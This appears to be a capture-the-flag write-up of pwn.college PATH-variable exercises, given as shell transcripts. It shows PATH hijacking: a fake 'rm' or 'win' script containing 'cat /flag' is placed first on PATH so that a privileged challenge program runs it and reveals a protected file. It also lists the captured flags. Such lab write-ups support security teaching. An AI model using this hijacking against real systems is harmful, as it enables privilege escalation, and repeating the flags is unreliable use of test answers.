# The PATH Variable
~~~
hacker@path~the-path-variable:~$ PATH="rm"
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: command not found
The flag is still there! I might as well give it to you!
pwn.college{UlfqZXuU_7LMvvwqpjtigFsBFoy.dZzNwUDL2kjN0czW}hacker@path~the-path-variable:~$ PATH="rm"
~~~
# Setting Path
~~~
hacker@path~setting-path:~$ echo "/challenge/more_commands/" > win
hacker@path~setting-path:~$ chmod +x win
hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{wTCwYfjTZ0i3ea5VQ1ml2d2s87Z.dVzNyUDL2kjN0czW}
~~~
# Adding Commands
inside nano I typed `cat /flag`.
~~~
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ chmod +x win
hacker@path~adding-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~$ PATH="~"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{A8oJE63WDaMdRJjC1_InKdGq0rO.dZzNyUDL2kjN0czW}
~~~
# Hijacking Commands 
~~~
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ PATH="~"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{k_tRnERc-OakpXelJjebn9jwuGz.ddzNyUDL2kjN0czW}
~~~
